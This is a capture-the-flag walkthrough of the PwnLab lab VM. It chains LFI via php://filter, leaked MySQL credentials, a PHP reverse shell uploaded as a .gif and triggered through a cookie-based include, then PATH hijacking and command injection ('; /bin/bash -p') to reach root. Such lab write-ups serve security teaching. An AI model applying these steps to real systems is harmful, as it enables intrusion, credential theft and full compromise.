root@kali ~/D/C/PWNLAB# nmap -sS -T4 -p- 10.0.0.22

PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql
53241/tcp open  unknown

An NMAP scan shows 2 interesting ports, rpcbind and port 53241 don't come into affect.
Let's start enumerating HTTP and try to get creds to log into mysql.

--------------------------------------------------------------------------
HTTP 
--------------------------------------------------------------------------
root@kali ~/D/C/PWNLAB# dirsearch -u http://10.0.0.22

/config.php
/images/
/index.php
/login.php
/upload/
/upload.php

We are not permitted to view config.php. Going to http://10.0.0.22 there are 3 hyperlinks, Home, Login and Upload. Going to the Login page, it seems it might be vulnerable to LFI (Local File Inclusion).

http://10.0.0.22/?page=login

I tried accessing the /etc/passwd file but nothing showed up.

http://10.0.0.22/?page=../../../../etc/passwd

Now at this point I got stuck. I tried finding other ways to perform a LFI but found nothing. A write up I found pointed to this site ----> https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/

The article suggests to use the php://filter wrapper and base64 encode the content of the file we enter in the resource.

PHP provides a number of I/O streams that allow access to PHP's own input and output streams and filters that can manipulate other file resources as they are read from and written to. php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. "php://filter/convert.base64-encode/resource=" forces PHP to base64 encode the file before it is used in the require statment. From this point it's a matter of decoding the base64 string.

We can now try to read the config.php file we are not permitted to.
For some reason entering "config.php" as the resouce name doesn't return any content, but "config" does.

http://10.0.0.22/?page=php://filter/convert.base64-encode/resource=config

PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+

Base64 decode:

{
	<?php
	$server	  = "localhost";
	$username = "root";
	$password = "H4u%QJ_H99";
	$database = "Users";
	?
}

We know have credentials (root:H4u%QJ_H99) we can use to log into the site hosted on the web server via the login.php page or mysql on port 3306. login.php doesn't work so let's try to log into the sql database and get more information.

root@kali ~/D/C/PWNLAB [1]# mysql -h 10.0.0.22 -u root -p
Enter Password: H4u%QJ_H99

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+

MySQL [(none)]> use Users;

Database changed
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+

After decoding the base64 encoded passwords we can try to log into the site and try get a reverse shell (since SSH isn't available).

kent:JWzXuBJJNy
mike:SIfdsTEn6I
kane:iSv5Ym2GRo

After logging with the kent user we can actually use the site as it was intended (not really) and upload a file. I tried uploading a reverse shell written in php and this error was prompted ---> "Not allowed extension, please upload images only.". Changing the file name from "php-reverse-shell.php" to "php-reverse-shell.php.gif" allows us to upload it. It is stored a the directory /upload and is hashed .

Going to http://10.0.0.27/upload/450619c0f9b99fca3f46d28787bc55c5.gif gives us an error "The "image http://10.0.0.27/upload/450619c0f9b99fca3f46d28787bc55c5.gif" cannot be displayed because it contains errors". Let's try to find a different way to access the script.

index.php source code:

{
	<?php
	//Multilingual. Not implemented yet.
	//setcookie("lang","en.lang.php");
	if (isset($_COOKIE['lang']))
	{
		include("lang/".$_COOKIE['lang']);
	}
	// Not implemented yet.
	?>
	<html>
	<head>
	<title>PwnLab Intranet Image Hosting</title>
	</head>
	<body>
	<center>
	<img src="images/pwnlab.png"><br />
	[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
	<hr/><br/>
	<?php
		if (isset($_GET['page']))
		{
			include($_GET['page'].".php");
		}
		else
		{
			echo "Use this server to upload and share image files inside the intranet";
		}
	?>
	</center>
	</body>
	</html>
}

Using Burp Suite we can access the cookie "lang" that was mentioned in the index.php script above and use it for another LFI to access the reverse shell script we uploaded.

Cookie: lang=../upload/450619c0f9b99fca3f46d28787bc55c5.gif

root@kali ~/D/C/PWNLAB# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.0.27] from (UNKNOWN) [10.0.0.22] 42403
$ whoami
www-data
$ sudo -l
bash: sudo: command not found

Going to the /home folder there are 4 users:

drwxr-x--- 2 john john 4096 Mar 17  2016 john
drwxr-x--- 2 kane kane 4096 Mar  1 17:03 kane
drwxr-x--- 2 kent kent 4096 Mar 17  2016 kent
drwxr-x--- 2 mike mike 4096 Mar 17  2016 mike

Let's if the passwords for the users in the site are the same here. We are able to log into the user 'kent' but his folder doesn't hold anything interesting. The password we found for the user 'mike' doesn't work. Luckily the password for the user 'kane' is correct.

After logging in as the user 'kane' and going to /home/kane, we can see that there is an executable called "msgmike", running it gives the error cat: /home/mike/msg.txt: No such file or directory.
It seems we need to change the PATH variable and make the a fake 'cat' command to give us a shell.

cat:

#!/bin/bash

/bin/bash

kane@pwnlab:~$ export PATH=/home/kane
kane@pwnlab:~$ ./msgmike
./msgmike
bash: dircolors: command not found
bash: ls: command not found
mike@pwnlab:~$ export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
mike@pwnlab:~$ whoami
mike

NICE! We are successfully logged in as the user 'mike'. Going to the directory /home/mike we find another executable "msg2root".
Using the "strings" command on the script "msg2root" we can see this line:

Message for root: 
/bin/echo %s >> /root/messages.txt

We are able to use ';' to inject code.

mike@pwnlab:/home/mike$ ./msg2root
Message for root: ; /bin/bash -p

bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# cat flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
